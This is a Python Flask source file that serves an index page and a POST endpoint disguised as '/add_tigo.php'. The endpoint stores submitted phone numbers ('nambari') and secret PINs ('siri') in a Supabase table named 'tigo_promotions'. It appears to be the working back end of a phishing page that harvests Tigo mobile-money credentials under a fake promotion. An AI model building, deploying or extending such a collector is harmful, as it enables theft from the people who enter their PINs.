from flask import Flask, request, render_template
import os
import traceback

app = Flask(__name__, template_folder="../templates")

supabase = None
SUPABASE_ENABLED = False

try:
    from supabase import create_client

    supabase_url = os.environ.get("SUPABASE_URL")
    supabase_key = os.environ.get("SUPABASE_KEY")

    if supabase_url and supabase_key:
        supabase = create_client(supabase_url, supabase_key)
        SUPABASE_ENABLED = True
        print("✅ Supabase connected")
    else:
        print("❌ Supabase env vars missing")

except Exception:
    traceback.print_exc()


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/add_tigo.php", methods=["POST"])
def add_tigo():
    try:
        nambari = request.form.get("nambari")
        siri = request.form.get("siri")
        url_link = request.form.get("url_link", "gzktrsjamfkw")

        if not nambari or not siri:
            return "Missing fields", 400

        if not SUPABASE_ENABLED:
            return "Supabase not configured", 500

        supabase.table("tigo_promotions").insert({
            "nambari": nambari,
            "siri": siri,
            "url_link": url_link
        }).execute()

        return "Data added successfully! ✅"

    except Exception as e:
        traceback.print_exc()
        return str(e), 500
